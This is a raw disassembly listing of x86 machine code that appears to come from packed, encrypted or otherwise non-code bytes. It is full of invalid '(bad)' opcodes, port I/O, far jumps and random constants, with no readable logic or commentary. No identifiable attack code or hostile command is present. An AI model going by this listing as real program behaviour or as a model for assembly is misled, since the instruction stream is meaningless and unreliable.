  409b65:	ror    BYTE PTR [ecx+0xc5311e2],cl
  409b6b:	add    eax,0x548ddfca
  409b70:	pop    edi
  409b71:	cmp    edi,DWORD PTR [ebp+0x43ce49ee]
  409b77:	add    DWORD PTR [ebx-0x4b],0xadb25297
  409b7e:	int3   
  409b7f:	sar    BYTE PTR [ebx],1
  409b81:	or     DWORD PTR [ecx],ebx
  409b83:	fldlg2 
  409b85:	out    dx,eax
  409b86:	cwde   
  409b87:	pop    ebp
  409b88:	push   ss
  409b89:	xor    DWORD PTR [edi+0x35],ebp
  409b8c:	arpl   WORD PTR [eax+ecx*4],dx
  409b8f:	sub    esp,DWORD PTR ds:0x5c964aa9
  409b95:	pop    esi
  409b96:	xor    dh,BYTE PTR [esi-0x2d]
  409b99:	out    0xf,eax
  409b9b:	push   0xffffff8f
  409b9d:	inc    esi
  409b9e:	mov    ch,BYTE PTR [edx+ebp*2+0xa]
  409ba2:	lods   eax,DWORD PTR ds:[esi]
  409ba3:	inc    edx
  409ba4:	out    0xf3,eax
  409ba6:	and    dl,BYTE PTR [esp+esi*1-0x189e8789]
  409bad:	(bad)  
  409baf:	sub    esi,ecx
  409bb1:	push   DWORD PTR [eax]
  409bb3:	gs out dx,al
  409bb5:	or     al,0xb4
  409bb7:	cli    
  409bb8:	shl    BYTE PTR [ecx+esi*2-0x2ef1e18e],1
  409bbf:	mov    esp,DWORD PTR [esi+0x34]
  409bc2:	inc    esi
  409bc3:	dec    esp
  409bc4:	push   ebx
  409bc5:	add    al,0x54
  409bc7:	into   
  409bc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409bc9:	lea    eax,[ebp-0x21c58659]
  409bcf:	imul   ebp,DWORD PTR [esi],0x65
  409bd2:	mov    edi,0xf1a0516e
  409bd7:	add    eax,esi
  409bd9:	xchg   ebp,eax
  409bda:	mov    dh,0x21
  409bdc:	inc    esi
  409bdd:	mov    ah,0xe2
  409bdf:	popf   
  409be0:	sbb    DWORD PTR [edi-0x12],ecx
  409be3:	icebp  
  409be4:	sub    esp,ebp
  409be6:	xchg   esi,eax
  409be7:	adc    esp,DWORD PTR [ebx]
  409be9:	lods   al,BYTE PTR ds:[esi]
  409bea:	loope  0x409c22
  409bec:	xchg   ebx,eax
  409bed:	push   0x7a
  409bef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409bf0:	mov    esi,0xb9ecdb1a
  409bf5:	push   cs
  409bf6:	and    al,0x5e
  409bf8:	int3   
  409bf9:	dec    eax
  409bfa:	outs   dx,DWORD PTR ds:[esi]
  409bfb:	sahf   
  409bfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bfd:	aas    
  409bfe:	inc    ebx
  409bff:	in     al,0xf7
  409c01:	rcl    BYTE PTR [ebp-0x49fa2607],cl
  409c07:	sar    DWORD PTR [edx-0x15adff68],cl
  409c0d:	popf   
  409c0e:	cs jnp 0x409c2e
  409c11:	mov    eax,0xf75f02fa
  409c16:	mov    esi,DWORD PTR [ecx+0x5]
  409c19:	xchg   DWORD PTR [ecx+0x2587d068],edx
  409c1f:	jmp    0x409bf6
  409c21:	dec    ebp
  409c22:	scas   eax,DWORD PTR es:[edi]
  409c23:	dec    esi
  409c24:	ror    DWORD PTR [eax+0x6cfa351f],1
  409c2a:	mov    bl,0x9f
  409c2c:	push   ss
  409c2d:	cmp    DWORD PTR [ebx-0x133a097a],0xfe765a3e
  409c37:	adc    eax,DWORD PTR [ecx+0x3eff54ca]
  409c3d:	jne    0x409cbc
  409c3f:	xchg   ecx,esi
  409c41:	mov    ebx,0x5be77666
  409c46:	fdiv   DWORD PTR [esi+0x32]
  409c49:	rcl    ch,0x53
  409c4c:	mov    bh,0xcb
  409c4e:	push   0x6620124a
  409c53:	mov    esp,0x52a86603
  409c58:	mov    WORD PTR [edi+0x15],ds
  409c5b:	mov    eax,0x2772938b
  409c60:	mov    cl,0xc6
  409c62:	xchg   edx,eax
  409c63:	(bad)  
  409c65:	or     DWORD PTR ds:0xa6d9fb62,ebp
  409c6b:	sub    BYTE PTR [ebx],dh
  409c6d:	enter  0xce8d,0xb5
  409c71:	arpl   WORD PTR [eax-0x4c9ed41e],dx
  409c77:	xchg   dl,bl
  409c79:	es jae 0x409cc9
  409c7c:	sar    DWORD PTR [ebx+0x6],1
  409c7f:	xchg   DWORD PTR [ecx+0x63],edx
  409c82:	push   cs
  409c83:	rcl    ebx,cl
  409c85:	cmp    ch,BYTE PTR [ecx-0x41a400f2]
  409c8b:	retf   
  409c8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c8d:	pop    eax
  409c8e:	fcomi  st,st(1)
  409c90:	push   ds
  409c91:	sbb    edi,DWORD PTR [edx+0x59310944]
  409c97:	adc    DWORD PTR [ebp+0x3a],0x702da9b4
  409c9e:	call   0x8cd7:0x3cb58071
  409ca5:	jmp    0x45b11ccd
  409caa:	mov    gs,WORD PTR [eax+0x30]
  409cad:	mov    cl,0x76
  409caf:	jl     0x409c74
  409cb1:	test   al,0x8c
  409cb3:	jae    0x409c89
  409cb5:	fldcw  WORD PTR [eax]
  409cb7:	test   eax,0xcdf347b1
  409cbc:	inc    edx
  409cbd:	jbe    0x409c5b
  409cbf:	dec    esp
  409cc0:	inc    esp
  409cc1:	jns    0x409cca
  409cc3:	ror    DWORD PTR [edx-0x15f5c995],cl
  409cc9:	nop
  409cca:	popa   
  409ccb:	test   edi,ebx
  409ccd:	call   0x6255:0x817cee9b
  409cd4:	shl    BYTE PTR [esi],cl
  409cd6:	in     al,dx
  409cd7:	jmp    0x88b0:0x9730d472
  409cde:	xor    ch,BYTE PTR [edi]
  409ce0:	jmp    0x24c46045
  409ce5:	es push ds
  409ce7:	scas   al,BYTE PTR es:[edi]
  409ce8:	mov    es,WORD PTR [ecx+0x3b]
  409ceb:	dec    eax
  409cec:	jbe    0x409cdf
  409cee:	mov    ah,0xd9
  409cf0:	lds    edi,FWORD PTR [ebp-0x7a0633d8]
  409cf6:	fsub   QWORD PTR [edx+eiz*8-0x4ce3fa44]
  409cfd:	jns    0x409d47
  409cff:	cmc    
  409d00:	xchg   ecx,eax
  409d01:	cmp    BYTE PTR ds:0x531d038b,dl
  409d07:	push   ds
  409d08:	popf   
  409d09:	xchg   esi,eax
  409d0a:	js     0x409c8f
  409d0c:	sbb    ecx,DWORD PTR [eax+0x5fcba0c0]
  409d12:	push   edx
  409d13:	idiv   BYTE PTR [ecx+edi*1-0x6f]
  409d17:	dec    esp
  409d18:	stc    
  409d19:	es inc edi
  409d1b:	pop    edi
  409d1c:	loopne 0x409d05
  409d1e:	(bad)  
  409d1f:	int    0x35
  409d21:	scas   al,BYTE PTR es:[edi]
  409d22:	adc    ebx,0x56
  409d25:	(bad)  
  409d26:	test   al,0xfe
  409d28:	adc    ch,BYTE PTR [ecx+0x48]
  409d2b:	sbb    BYTE PTR [ebp-0x4a],0x21
  409d2f:	mov    dh,0xeb
  409d31:	cmp    al,bh
  409d33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d34:	mov    ch,0x1e
  409d36:	sbb    cl,BYTE PTR [ecx-0x6045c7fb]
  409d3c:	arpl   ax,bp
  409d3e:	(bad)  
  409d3f:	sar    BYTE PTR [edx],cl
  409d41:	or     DWORD PTR [ebp+ecx*1-0x2eef678e],esi
  409d48:	xchg   ebx,eax
  409d49:	ficom  DWORD PTR [ebp-0x1]
  409d4c:	(bad)  
  409d4d:	jno    0x409d80
  409d4f:	sti    
  409d50:	pop    es
  409d51:	enter  0xcb57,0xdb
  409d55:	mov    edx,0xa03ec8a
  409d5a:	leave  
  409d5b:	pop    ss
  409d5c:	xchg   DWORD PTR [eax+edx*1-0x5eb85977],esi
  409d63:	push   ecx
  409d64:	(bad)  
  409d65:	mov    ecx,0xcba54ab2
  409d6a:	pop    ds
  409d6b:	repz shl DWORD PTR [eax+0x4],1
  409d6f:	scas   eax,DWORD PTR es:[edi]
  409d70:	or     bl,BYTE PTR [ebp-0x22]
  409d73:	call   0x9ed9:0x41d80b88
  409d7a:	dec    esp
  409d7b:	into   
  409d7c:	push   ebx
  409d7d:	push   eax
  409d7e:	sti    
  409d7f:	shl    BYTE PTR [edi+0x46ae0f66],1
  409d85:	cdq    
  409d86:	out    dx,al
  409d87:	adc    eax,0x339764d3
  409d8c:	xchg   esp,eax
  409d8d:	sbb    dh,BYTE PTR ds:0x9627c8d
  409d93:	cs inc edx
  409d95:	xlat   BYTE PTR ds:[ebx]
  409d96:	mov    eax,0x74bbff16
  409d9b:	pushf  
  409d9c:	jp     0x409dfa
  409d9e:	out    0xc4,al
  409da0:	mov    ecx,0x74a573db
  409da5:	lods   al,BYTE PTR ds:[esi]
  409da6:	pop    eax
  409da7:	sar    dl,1
  409da9:	adc    cl,BYTE PTR [esi-0x2984404]
  409daf:	jne    0x409e30
  409db1:	jnp    0x409da1
  409db3:	push   0x42c67e48
  409db8:	ins    DWORD PTR es:[edi],dx
  409db9:	adc    BYTE PTR [edx+0x4c460325],ch
  409dbf:	psllw  mm1,QWORD PTR [eax+0x58]
  409dc3:	pcmpeqd mm7,mm0
  409dc6:	sub    al,0x92
  409dc8:	test   BYTE PTR [esi+0x1a894261],bl
  409dce:	ss push edi
  409dd0:	loope  0x409de9
  409dd2:	sub    al,0x86
  409dd4:	and    DWORD PTR gs:[edx-0x1e3df8e1],edx
  409ddb:	mov    edx,0x9b7884af
  409de0:	inc    esp
  409de1:	or     BYTE PTR [ecx+eiz*8],cl
  409de4:	jne    0x409e25
  409de6:	popa   
  409de7:	inc    ebx
  409de8:	add    al,0x70
  409dea:	push   eax
  409deb:	or     BYTE PTR ds:0x2d8b45b9,ah
  409df1:	iret   
  409df2:	jns    0x409d81
  409df4:	(bad)  
  409df5:	pop    esp
  409df6:	mov    ecx,0x24b76b38
  409dfb:	mov    dl,0x58
  409dfd:	xor    ebp,DWORD PTR [eax]
  409dff:	add    ebx,edi
  409e01:	scas   al,BYTE PTR es:[edi]
  409e02:	out    dx,eax
  409e03:	fnstsw WORD PTR ds:[edi-0x68]
  409e07:	pop    esi
  409e08:	nop
  409e09:	daa    
  409e0a:	nop
  409e0b:	bound  esp,QWORD PTR [eax-0x36]
  409e0e:	cwde   
  409e0f:	loop   0x409e42
  409e11:	sbb    DWORD PTR [esi],0x74
  409e14:	push   0x1748a6bb
  409e19:	mov    eax,ds:0xfbff1b5c
  409e1e:	test   BYTE PTR [ecx],al
  409e20:	push   es
  409e21:	pop    edi
  409e22:	in     al,0xe1
  409e24:	cdq    
  409e25:	fcmove st,st(5)
  409e27:	gs and al,0x35
  409e2a:	loopne 0x409e7d
  409e2c:	inc    DWORD PTR [eax]
  409e2e:	lods   al,BYTE PTR ds:[esi]
  409e2f:	push   ecx
  409e30:	(bad)  
  409e31:	neg    BYTE PTR [ebp+0x25d0cbe6]
  409e37:	ins    BYTE PTR es:[edi],dx
  409e38:	aaa    
  409e39:	dec    esp
  409e3a:	sar    ebp,1
  409e3c:	(bad)  
  409e3d:	fcmovbe st,st(1)
  409e3f:	arpl   WORD PTR [esi+0x52164b5b],ax
  409e45:	arpl   ax,cx
  409e47:	fbstp  TBYTE PTR [edx-0x5f642b0d]
  409e4d:	addr16 mov ah,0xf
  409e50:	pop    esp
  409e51:	loop   0x409e78
  409e53:	jecxz  0x409e52
  409e55:	fnstcw WORD PTR [edx+esi*8]
  409e58:	xchg   ebx,eax
  409e59:	inc    edx
  409e5a:	aad    0x63
  409e5c:	pop    ds
  409e5d:	enter  0x848a,0xb
  409e61:	(bad)  [edx+0x1147f807]
  409e67:	or     dl,0x77
  409e6a:	fimul  WORD PTR [esi+0x7d]
  409e6d:	mov    al,ds:0x4a911b5
  409e72:	push   esi
  409e73:	pushfw 
  409e75:	nop
  409e76:	fwait
  409e77:	enter  0xdc64,0xa5
  409e7b:	cmp    cl,BYTE PTR [esi-0x4f]
  409e7e:	int    0x15
  409e80:	pop    edi
  409e81:	loop   0x409e3d
  409e83:	outs   dx,BYTE PTR ds:[esi]
  409e84:	nop
  409e85:	inc    eax
  409e86:	shl    dh,1
  409e88:	push   eax
  409e89:	inc    edx
  409e8a:	fisubr WORD PTR gs:[edx]
  409e8d:	addr16 push esp
  409e8f:	dec    ecx
  409e90:	into   
  409e91:	into   
  409e92:	pop    esp
  409e93:	pop    eax
  409e94:	and    edx,edx
  409e96:	mov    eax,ds:0x9a041cf9
  409e9b:	xchg   esi,eax
  409e9c:	xchg   esi,eax
  409e9d:	or     ah,BYTE PTR [edi]
  409e9f:	and    DWORD PTR [ecx-0xaf8d689],ebp
  409ea5:	jo     0x409edd
  409ea7:	push   ss
  409ea8:	and    al,0xf9
  409eaa:	or     DWORD PTR [edi],ecx
  409eac:	pop    ebx
  409ead:	sbb    dl,BYTE PTR [edi]
  409eaf:	adc    al,0x8f
  409eb1:	jnp    0x409ebe
  409eb3:	rcr    BYTE PTR [edx],0x3b
  409eb6:	mov    cl,0x3c
  409eb8:	gs dec esp
  409eba:	outs   dx,DWORD PTR ds:[esi]
  409ebb:	mov    ch,0x81
  409ebd:	pop    eax
  409ebe:	in     eax,dx
  409ebf:	jbe    0x409f08
  409ec1:	and    BYTE PTR [esi+0x2cc6564c],0x82
  409ec8:	in     al,0x6b
  409eca:	pop    ebp
  409ecb:	xor    dh,BYTE PTR [edi]
  409ecd:	call   FWORD PTR [edi+0x68]
  409ed0:	aas    
  409ed1:	pop    eax
  409ed2:	mov    bh,BYTE PTR [edi]
  409ed4:	fldcw  WORD PTR [ebp+0x9efe0cf]
  409eda:	(bad)  
  409edb:	frstor [eax-0x85bf860]
  409ee1:	xchg   edx,eax
  409ee2:	outs   dx,BYTE PTR ds:[esi]
  409ee3:	rcl    BYTE PTR [edx],cl
  409ee5:	stc    
  409ee6:	call   0xd1c2:0x2efedd01
  409eed:	xor    al,0x91
  409eef:	mov    ebp,0x8b2cbb83
  409ef4:	or     eax,0xbae32be
  409ef9:	dec    esi
  409efa:	loop   0x409f34
  409efc:	pop    esi
  409efd:	arpl   WORD PTR [ebx+0x1a],si
  409f00:	adc    eax,0x2a17773b
  409f05:	nop
  409f06:	lods   eax,DWORD PTR ds:[esi]
  409f07:	pusha  
  409f08:	mov    BYTE PTR [esi+0x1d93b003],bl
  409f0e:	push   0x17
  409f10:	hlt    
  409f11:	cli    
  409f12:	dec    edi
  409f13:	xchg   ebx,eax
  409f14:	xor    bh,ch
  409f16:	bnd jo 0x409eb4
  409f19:	and    edx,esi
  409f1b:	test   BYTE PTR [esi+0x2f],cl
  409f1e:	aas    
  409f1f:	lea    edi,[edi+0x288c68e4]
  409f25:	lock xor ch,al
  409f28:	mov    DWORD PTR [eax],eax
  409f2a:	mov    ah,0x7a
  409f2c:	enter  0xeeac,0x6
  409f30:	adc    dl,BYTE PTR [eax]
  409f32:	(bad)  
  409f33:	(bad)  
  409f34:	sti    
  409f35:	pop    ss
  409f36:	pop    esi
  409f37:	out    dx,al
  409f38:	stos   DWORD PTR es:[edi],eax
  409f39:	call   0x3802:0x592a514f
  409f40:	inc    eax
  409f41:	imul   esi,DWORD PTR [esi+0x2f],0xffffff8b
  409f45:	xor    bl,ch
  409f47:	pop    ss
  409f48:	ins    BYTE PTR es:[edi],dx
  409f49:	sbb    BYTE PTR [eax+0x4],cl
  409f4c:	repz sub esi,DWORD PTR [ebx-0xa]
  409f50:	shl    DWORD PTR [edi],0x64
  409f53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f54:	jg     0x409ef8
  409f56:	add    DWORD PTR [esi-0x291db59a],edi
  409f5c:	push   eax
  409f5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f5e:	push   esp
  409f5f:	jne    0x409f9c
  409f61:	(bad)  
  409f62:	inc    ebp
  409f63:	daa    
  409f64:	and    edx,edx
  409f66:	iret   
  409f67:	sub    DWORD PTR [edx],ebx
  409f69:	mov    ebp,0xfeae2977
  409f6e:	and    al,0xb5
  409f70:	dec    ebx
  409f71:	arpl   WORD PTR [ebp+0x1],bx
  409f74:	cmp    BYTE PTR [edi-0x6c4a2852],dl
  409f7a:	cmc    
  409f7b:	dec    ebp
  409f7c:	xor    DWORD PTR [esp+esi*8-0x208fd724],esi
  409f83:	mov    BYTE PTR [eax-0xe],dl
  409f86:	shl    BYTE PTR ds:0x6ff785ee,1
  409f8c:	add    al,0x50
  409f8e:	call   0x3c78:0x4394b0af
  409f95:	inc    edi
  409f96:	or     eax,DWORD PTR [ebx]
  409f98:	movq   mm7,mm2
  409f9b:	gs jne 0x409feb
  409f9e:	mov    dh,0xc5
  409fa0:	test   DWORD PTR [ecx+0xeadf857],ebx
  409fa6:	xlat   BYTE PTR ds:[ebx]
  409fa7:	cmp    bl,BYTE PTR [edi+0x2dbee064]
  409fad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409fae:	and    esi,esi
  409fb0:	lods   al,BYTE PTR ds:[esi]
  409fb1:	fisttp DWORD PTR [ebx]
  409fb3:	scas   al,BYTE PTR es:[edi]
  409fb4:	stos   DWORD PTR es:[edi],eax
  409fb5:	sahf   
  409fb6:	sub    BYTE PTR [esi+ecx*4-0x51],al
  409fba:	and    ch,al
  409fbc:	mov    edx,0x10247ea6
  409fc1:	clc    
  409fc2:	sbb    al,0x8e
  409fc4:	pop    ds
  409fc5:	lods   eax,DWORD PTR ds:[esi]
  409fc6:	mov    cl,bl
  409fc8:	call   0xce89:0x8160dd3
  409fcf:	ins    BYTE PTR es:[edi],dx
  409fd0:	pop    es
  409fd1:	sub    ah,BYTE PTR [edi-0x62]
  409fd4:	or     edx,eax
  409fd6:	and    eax,0x50e6f64
  409fdb:	jmp    0x4afb:0x69eb1b67
  409fe2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fe3:	dec    esp
  409fe4:	pop    ss
  409fe5:	leave  
  409fe6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fe7:	push   edi
  409fe8:	test   BYTE PTR [edi+0x22],ch
  409feb:	ja     0x40a05a
  409fed:	popa   
  409fee:	xor    BYTE PTR [eax],ah
  409ff0:	and    eax,0x80a83cf
  409ff5:	inc    edi
  409ff6:	int    0x2
  409ff8:	loop   0x40a042
  409ffa:	ds ins DWORD PTR es:[edi],dx
  409ffc:	sub    al,0xf4
  409ffe:	sbb    eax,0x801181b6
  40a003:	mov    cl,0x27
  40a005:	sbb    DWORD PTR [ebx+0x2aa65b8e],ebx
  40a00b:	idiv   BYTE PTR [ecx-0x94ccb9f]
  40a011:	adc    eax,DWORD PTR [edx-0x35]
  40a014:	cld    
  40a015:	cmp    DWORD PTR [eax-0x380fd925],ebp
  40a01b:	add    al,0x55
  40a01d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a01e:	mov    edi,0x2259e234
  40a023:	pop    ebx
  40a024:	inc    ebx
  40a025:	adc    dl,dh
  40a027:	push   eax
  40a028:	sbb    esi,esp
  40a02a:	call   0x540ae769
  40a02f:	add    edi,DWORD PTR [ebx-0x13e43bba]
  40a035:	cmp    eax,0xa43dfca4
  40a03a:	jge    0x409fcd
  40a03c:	xor    eax,0x73300919
  40a041:	and    BYTE PTR [eax],al
  40a043:	dec    edi
  40a044:	jecxz  0x40a08e
  40a046:	or     eax,0xb2f0e577
  40a04b:	pop    esi
  40a04c:	xor    edi,DWORD PTR [ecx-0x7]
  40a04f:	adc    DWORD PTR [ecx-0x73eeb98c],0x33
  40a056:	out    dx,eax
  40a057:	mov    esi,0xf4d8491b
  40a05c:	sub    esp,DWORD PTR [ecx-0x53]
  40a05f:	jnp    0x40a05d
  40a061:	aam    0xc0
  40a063:	fld    QWORD PTR [edi-0x35624725]
  40a069:	sub    BYTE PTR [esi+0x78],ch
  40a06c:	xor    BYTE PTR [ecx+edx*1-0x4a],0x9c
  40a071:	mov    bl,0x83
  40a073:	in     al,dx
  40a074:	pop    edi
  40a075:	xor    esp,DWORD PTR [eax]
  40a077:	fcom   DWORD PTR [ecx-0x4d]
  40a07a:	fmul   DWORD PTR ds:0xdad25bef
  40a080:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a081:	xor    edi,ebp
  40a083:	in     eax,dx
  40a084:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a085:	mov    eax,0x631f8270
  40a08a:	stos   BYTE PTR es:[edi],al
  40a08b:	mov    DWORD PTR [eax-0x28],edi
  40a08e:	pop    esi
  40a08f:	lea    esp,[ebx+0x21c457ff]
  40a095:	jne    0x40a111
  40a097:	jle    0x40a039
  40a099:	xor    al,0x34
  40a09b:	mov    esi,0x34614b0f
  40a0a0:	xor    cl,BYTE PTR [ebp-0x5]
  40a0a3:	add    eax,0xeabeb807
  40a0a8:	repz bound ecx,QWORD PTR [eax-0x15]
  40a0ac:	cs popa 
  40a0ae:	lods   eax,DWORD PTR ds:[esi]
  40a0af:	jnp    0x40a07f
  40a0b1:	xchg   esp,eax
  40a0b2:	aaa    
  40a0b3:	mov    edx,0xe548b013
  40a0b8:	mov    WORD PTR [esi+0x243bd9f4],ds
  40a0be:	add    DWORD PTR [edx+0x79],0xffffffcb
  40a0c2:	out    dx,al
  40a0c3:	call   0x7e78:0xa629e9dc
  40a0ca:	test   DWORD PTR [edi+0x1f813799],0x25e06fcb
  40a0d4:	add    edx,DWORD PTR [esi+0x666f71c8]
  40a0da:	fdivr  QWORD PTR [esi]
  40a0dc:	inc    ebx
  40a0dd:	ins    DWORD PTR es:[edi],dx
  40a0de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0df:	rcl    DWORD PTR [esi-0x1f],1
  40a0e2:	sbb    DWORD PTR [edi],eax
  40a0e4:	mov    DWORD PTR [esi],ecx
  40a0e6:	rcr    DWORD PTR [esi],cl
  40a0e8:	jo     0x40a0cf
  40a0ea:	fnsave [edx]
  40a0ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0ee:	je     0x40a137
  40a0f0:	sub    al,0x85
  40a0f2:	xor    BYTE PTR [ebp+esi*4-0x28a5170e],0xc1
  40a0fa:	js     0x40a0aa
  40a0fc:	test   al,0x3b
  40a0fe:	scas   al,BYTE PTR es:[edi]
  40a0ff:	push   ebx
  40a100:	arpl   WORD PTR [ecx*1+0x37865cc1],si
  40a107:	inc    edx
  40a108:	inc    ebx
  40a109:	imul   edx,ecx,0x65
  40a10c:	push   edx
  40a10d:	fist   DWORD PTR [esi+eiz*1+0x76]
  40a111:	add    edx,ebx
  40a113:	jb     0x40a0cc
  40a115:	jnp    0x40a153
  40a117:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a119:	inc    edi
  40a11a:	dec    edx
  40a11b:	out    dx,eax
  40a11c:	popa   
  40a11d:	shl    BYTE PTR [eax+0x9b6eede],1
  40a123:	inc    esi
  40a124:	xlat   BYTE PTR ds:[ebx]
  40a125:	push   0xf0885de3
  40a12a:	ss pop ebp
  40a12c:	icebp  
  40a12d:	mov    dl,0x16
  40a12f:	or     eax,0x3bbbed61
  40a134:	pop    esi
  40a135:	mov    ch,BYTE PTR [eax]
  40a137:	aad    0x69
  40a139:	int3   
  40a13a:	mov    edi,0xeafb8d4d
  40a13f:	aas    
  40a140:	cld    
  40a141:	ja     0x40a1b8
  40a143:	adc    DWORD PTR [edx-0x48],esp
  40a146:	mov    esp,0x5087f9bb
  40a14b:	loope  0x40a0e5
  40a14d:	pop    es
  40a14e:	and    bh,BYTE PTR fs:[edi+0x9]
  40a152:	mov    edi,0x55f2508c
  40a157:	ret    0xe436
  40a15a:	or     ch,BYTE PTR [ecx]
  40a15c:	ins    DWORD PTR es:[edi],dx
  40a15d:	sbb    BYTE PTR [edx],0x60
  40a160:	inc    DWORD PTR [edx-0x6]
  40a163:	add    BYTE PTR [edi],cl
  40a165:	arpl   dx,bx
  40a167:	mov    al,ds:0xceedd866
  40a16c:	sahf   
  40a16d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a16e:	mov    ebp,0x3f7d2485
  40a173:	test   BYTE PTR [edx-0x1e],al
  40a176:	adc    ecx,ebx
  40a178:	ret    
  40a179:	dec    ebp
  40a17a:	mov    bl,0x92
  40a17c:	mov    ch,0xbf
  40a17e:	cvtpi2ps xmm1,QWORD PTR ds:0x4257adb9
  40a185:	push   ss
  40a186:	sub    eax,0x79eb6db5
  40a18b:	xlat   BYTE PTR ds:[ebx]
  40a18c:	cdq    
  40a18d:	and    al,0x3f
  40a18f:	fcom   DWORD PTR [esi-0x78]
  40a192:	test   al,0x97
  40a194:	pop    esi
  40a195:	loope  0x40a209
  40a197:	push   es
  40a198:	int3   
  40a199:	aam    0x8d
  40a19b:	mov    al,0x7a
  40a19d:	pop    es
  40a19e:	(bad)  
  40a19f:	sbb    BYTE PTR [esi+0x63],al
  40a1a2:	mov    edx,0xdfde4826
  40a1a7:	dec    esi
  40a1a8:	or     DWORD PTR [eax+0x62],ebp
  40a1ab:	inc    ecx
  40a1ac:	pop    ss
  40a1ad:	add    BYTE PTR [eax+0x34613903],bh
  40a1b3:	add    DWORD PTR [ecx],edi
  40a1b5:	pushf  
  40a1b6:	inc    ecx
  40a1b7:	ret    
  40a1b8:	je     0x40a223
  40a1ba:	xchg   DWORD PTR [edi+ecx*4-0x2108ffc9],ebx
  40a1c1:	in     al,0xb2
  40a1c3:	dec    ebx
  40a1c4:	cmp    al,0xb4
  40a1c6:	mov    ebp,0x4fe33fab
  40a1cb:	sub    DWORD PTR [ecx+0x59a1615],ecx
  40a1d1:	mov    esi,0x11043fb4
  40a1d6:	das    
  40a1d7:	sbb    dh,cl
  40a1d9:	adc    DWORD PTR [ebx-0x31],0x9
  40a1dd:	xor    bl,BYTE PTR [esi+eax*8]
  40a1e0:	dec    ebx
  40a1e1:	test   eax,0xbc396b59
  40a1e6:	outs   dx,BYTE PTR ds:[esi]
  40a1e7:	or     DWORD PTR fs:[ecx-0x7a46dd3d],esi
  40a1ee:	push   eax
  40a1ef:	out    0x23,eax
  40a1f1:	jl     0x40a203
  40a1f3:	cmp    BYTE PTR [eax-0x49],0xe6
  40a1f7:	mov    ebp,0x6d5f1032
  40a1fc:	mov    cl,0xdd
  40a1fe:	push   ebx
  40a1ff:	push   ss
  40a200:	outs   dx,BYTE PTR ds:[esi]
  40a201:	dec    esp
  40a202:	imul   ebp,esi,0x4d3c0a30
  40a208:	or     BYTE PTR [edx+0x79],bh
  40a20b:	pop    ss
  40a20c:	mov    DWORD PTR [edi+0x7b9e0369],0x95b39508
  40a216:	mov    bh,0x88
  40a218:	xor    BYTE PTR [esi+eax*8-0x51],ah
  40a21c:	sbb    dl,0xb8
  40a21f:	pusha  
  40a220:	(bad)  
  40a221:	dec    al
  40a223:	in     al,dx
  40a224:	push   ebp
  40a225:	call   0x1bda61f1
  40a22a:	dec    esp
  40a22b:	fcom   DWORD PTR [esi-0x7425d23b]
  40a231:	sbb    al,0x21
  40a233:	test   al,0x58
  40a235:	jmp    0xdedd:0x45f7def1
  40a23c:	xor    eax,0xf9cb0a1b
  40a241:	cmp    bl,BYTE PTR [ebp+edx*8-0xd]
  40a245:	and    ch,cl
  40a247:	jp     0x40a28a
  40a249:	mov    ecx,DWORD PTR [ecx+0x67f27db9]
  40a24f:	sbb    BYTE PTR [ebx+0x757f0b23],ch
  40a255:	mov    dh,0x41
  40a257:	push   0xffffffe1
  40a259:	sbb    al,0x40
  40a25b:	jecxz  0x40a25a
  40a25d:	sub    esi,DWORD PTR [eax+0x38a4cad8]
  40a263:	mov    edi,0x6b607325
  40a268:	push   edx
  40a269:	(bad)  
  40a26a:	idiv   dh
  40a26c:	dec    ebp
  40a26d:	repnz test DWORD PTR [ecx],ecx
  40a270:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a271:	xor    BYTE PTR [edi],ch
  40a273:	sti    
  40a274:	cmp    edi,DWORD PTR [edx]
  40a276:	xchg   BYTE PTR [ecx+0x6b],ch
  40a279:	inc    esp
  40a27a:	jmp    0x8e9b5130
  40a27f:	push   eax
  40a280:	call   0x73243b86
  40a285:	pop    esi
  40a286:	loope  0x40a2c3
  40a288:	jbe    0x40a29e
  40a28a:	sub    BYTE PTR [eax-0x26],bh
  40a28d:	(bad)  
  40a28f:	popf   
  40a290:	pop    ecx
  40a291:	sbb    cl,BYTE PTR [edi-0x29b568d1]
  40a297:	imul   si,WORD PTR [edx+0x1213b631],0xffa8
  40a29f:	jae    0x40a2e7
  40a2a1:	lea    eax,[esp+esi*1-0xd02a8f1]
  40a2a8:	pop    ebx
  40a2a9:	jo     0x40a2e9
  40a2ab:	xlat   BYTE PTR ds:[ebx]
  40a2ac:	add    DWORD PTR [esi-0xd0f704f],ebp
  40a2b2:	lahf   
  40a2b3:	fbstp  TBYTE PTR [edi-0x57c33d1c]
  40a2b9:	mov    edi,0x2d55c726
  40a2be:	ret    0x6133
  40a2c1:	cld    
  40a2c2:	cmp    al,0xc7
  40a2c4:	jne    0x40a25f
  40a2c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2c7:	inc    ecx
  40a2c8:	fsubr  QWORD PTR [eax+0x691cfc08]
  40a2ce:	fldenv [eax+0x69490996]
  40a2d4:	out    dx,eax
  40a2d5:	mov    ecx,0x6a81f78d
  40a2da:	daa    
  40a2db:	pop    ds
  40a2dc:	mov    al,ds:0xe497d3fb
  40a2e1:	push   esp
  40a2e2:	aas    
  40a2e3:	dec    ebp
  40a2e4:	inc    edi
  40a2e5:	add    DWORD PTR [esi-0x2add0c55],esi
  40a2eb:	loope  0x40a286
  40a2ed:	and    al,0x60
